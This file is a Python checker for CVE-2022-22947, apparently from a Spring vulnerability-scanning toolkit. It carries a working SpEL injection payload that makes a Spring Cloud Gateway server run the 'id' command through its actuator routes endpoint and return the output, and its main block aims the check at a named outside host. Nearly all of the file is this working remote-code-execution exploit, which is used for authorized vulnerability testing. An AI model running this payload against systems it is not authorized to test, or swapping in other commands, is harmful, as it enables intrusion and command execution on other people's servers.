#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22947.py
   Description :   Check for CVE_2022_22947 vulnerability
   Author :       sule01u
   date：          2023/10/7
"""
import random
import requests
from configs.custom_headers import USER_AGENTS
from utils.format_utils import format_url
requests.packages.urllib3.disable_warnings()


def send_request(url, method, headers=None, data=None, proxies=None):
    """
    发送HTTP请求
    """
    if proxies:
        response = requests.request(method, url, headers=headers, data=data, proxies=proxies)
    else:
        response = requests.request(method, url, headers=headers, data=data)
    return response


def check(target_url, proxies=None):
    """
    对给定的目标URL检测CVE-2022-22947漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json'
    }

    headers2 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    payload = '''{\r
        "id": "hacktest",\r
        "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}"}\r
        }],\r
        "uri": "http://example.com",\r
        "order": 0\r
    }'''
    # 构建请求url
    target_url = format_url(target_url, "http").rstrip("/")
    try:
        res1 = send_request(target_url + "/actuator/gateway/routes/hacktest", 'POST', headers1, payload, proxies)

        if res1.status_code != 201:
            return False, {
                "CVE_ID": "CVE-2022-22947",
                "URL": res1.url,
                "Details": f"检测到CVE-2022-22947的RCE漏洞",
                "response": res1.json()
            }

        send_request(target_url + "/actuator/gateway/refresh", 'POST', headers2, proxies=proxies)
        res3 = send_request(target_url + "/actuator/gateway/routes/hacktest", 'GET', headers2, proxies=proxies)
        send_request(target_url + "/actuator/gateway/routes/hacktest", 'DELETE', headers2, proxies=proxies)
        send_request(target_url + "/actuator/gateway/refresh", 'POST', headers2, proxies=proxies)

        if res3.status_code == 200:
            return True, {
                "CVE_ID": "CVE-2022-22947",
                "URL": res3.url,
                "Details": f"检测到CVE-2022-22947的RCE漏洞",
                "response": res3.json()
            }
        else:
            return False, {
                "CVE_ID": "CVE-2022-22947",
                "URL": target_url,
                "Details": "未检测到CVE-2022-22947的RCE漏洞"
            }
    except requests.RequestException as e:
        return False, {
            "CVE_ID": "CVE-2022-22947",
            "URL": target_url,
            "Details": f"请求发生错误: {e}"
        }


if __name__ == "__main__":
    target = "http://lumi.wang/"
    is_vulnerable, result = check(format_url(target, "http"))
    print(result)
